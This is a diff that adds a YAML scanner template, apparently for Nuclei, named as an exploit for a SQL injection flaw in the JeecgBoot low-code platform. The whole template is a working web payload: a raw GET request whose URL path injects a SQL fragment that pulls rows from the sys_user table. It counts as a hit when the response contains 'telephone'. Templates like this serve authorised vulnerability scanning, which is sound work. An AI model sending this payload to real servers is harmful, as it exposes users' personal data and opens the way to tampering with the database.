@@ -1,0 +1,32 @@
+id: jeecgboot-sqli-exploit
+
+info:
+  name: JeecgBoot SQL Injection Exploit
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    JeecgBoot is a low-code development platform based on a code generator, designed to simplify Java project development and enhance efficiency. Attackers can exploit SQL injection vulnerabilities to steal, manipulate, or delete database data, or even execute system commands, leading to severe impacts on websites and servers.
+  tags: sqli, jeecgboot
+
+http:
+  - raw:
+      - |
+        GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Sec-Purpose: prefetch
+        Connection: close
+        Priority: u=6
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "telephone"
+        part: body
